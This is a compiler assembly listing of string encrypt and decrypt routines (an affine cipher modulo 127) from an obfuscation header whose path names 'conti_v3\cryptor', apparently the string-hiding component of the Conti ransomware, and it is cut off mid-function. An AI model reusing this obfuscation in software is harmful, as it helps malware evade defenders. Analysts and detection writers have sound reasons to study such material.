?decrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 5d 00 00 00	 mov	 ecx, 93			; 0000005dH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5d	 add	 r8d, 93			; 0000005dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 70 00 00 00	 mov	 ecx, 112		; 00000070H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 70	 add	 r8d, 112		; 00000070H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 4b 00 00 00	 mov	 ecx, 75			; 0000004bH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4b	 add	 r8d, 75			; 0000004bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 42	 sub	 eax, 66			; 00000042H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 42	 add	 r8d, 66			; 00000042H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 2b	 sub	 eax, 43			; 0000002bH
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2b	 add	 r8d, 43			; 0000002bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 5a	 sub	 eax, 90			; 0000005aH
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5a	 add	 r8d, 90			; 0000005aH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
